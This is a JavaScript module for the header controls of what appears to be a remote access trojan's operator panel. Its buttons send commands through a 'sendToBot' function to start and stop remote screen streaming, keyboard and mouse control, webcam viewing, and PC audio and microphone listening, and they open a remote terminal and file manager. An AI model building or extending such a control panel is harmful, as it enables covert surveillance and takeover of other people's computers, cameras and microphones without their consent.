/* frontend/client_control/js/modules/ui/header.js */
import { AppState } from '../core/states.js';

export function initHeaderControls() {
    const $ = id => document.getElementById(id);
    const actions = [
        { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge', cmds: ['start_control', 'stop_control'] },
        { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'CamGaze', cmds: ['start', 'stop'] },
        { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', cmds: ['listen_pc_on', 'listen_pc_off'] },
        { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', cmds: ['listen_mic_on', 'listen_mic_off'] }
    ];

    const toggleAction = (a, force = null, silent = false) => {
        const btn = $(a.id), state = force ?? !a.ref[a.key];
        if (a.ref[a.key] === state && force === null) return;
        
        a.ref[a.key] = state;
        btn?.classList.toggle('active', state);

        if (a.id === 'btn-desktop-control') {
            const cvs = $('desktopCanvas');
            if (cvs) { cvs.style.pointerEvents = state ? 'auto' : 'none'; state && cvs.focus(); }
        }
        !silent && window.sendToBot?.(a.mod, state ? a.cmds[0] : a.cmds[1]);
    };

    const setupToggle = (btnId, ovlId, onOpen) => {
        const btn = $(btnId), ovl = $(ovlId);
        if (btn && ovl) btn.onclick = () => {
            const isH = ovl.classList.toggle('hidden');
            btn.classList.toggle('active', !isH);
            !isH && onOpen?.();
        };
    };

    setupToggle('btn-terminal-toggle', 'terminal-overlay', () => {
        window.resetTerminalPosition?.();
        setTimeout(() => $('terminal-cmd')?.focus(), 50);
    });
    setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());

    actions.forEach(a => $(a.id) && ($(a.id).onclick = () => toggleAction(a)));

    window.syncModeResources = mode => {
        [$('terminal-overlay'), $('files-overlay')].forEach(el => el?.classList.add('hidden'));
        [$('btn-terminal-toggle'), $('btn-files-toggle')].forEach(el => el?.classList.remove('active'));
        if (mode === 'webcam') {
            AppState.desktop.observe && toggleAction(actions[0], false);
            AppState.desktop.control && toggleAction(actions[1], false);
        } else if (mode === 'desktop' && AppState.webcam.active) toggleAction(actions[2], false);
    };
}